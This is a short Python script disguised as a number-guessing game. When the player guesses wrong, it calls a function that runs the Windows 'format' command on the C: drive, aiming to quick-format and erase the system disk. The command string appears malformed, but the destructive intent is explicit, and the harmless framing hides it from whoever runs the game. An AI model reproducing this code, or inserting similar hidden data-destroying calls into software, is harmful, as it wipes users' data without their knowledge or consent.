import random
import subprocess

def format_drive(drive_letter):
  subprocess.call(["format", drive_letter + ": /FS:NTFS /Q /V:OhNo"])



def handle_incorrect_guess():
    format_drive("C:")

def main():
    print("Welcome to the Random Number Game!")
    print("Try to guess the random number between 1 and 5.")

    # Generate a random number between 1 and 5
    random_number = random.randint(1, 5)

    try:
        chosen_number = int(input("Enter your guess (between 1 and 5): "))
        if chosen_number < 1 or chosen_number > 5:
            print("Please enter a number between 1 and 5.")
            return
    except ValueError:
        print("Invalid input. Please enter a number.")
        return

    if chosen_number == random_number:
        print("Congratulations! You guessed the correct number!")
    else:
        handle_incorrect_guess()

if __name__ == "__main__":
    main()
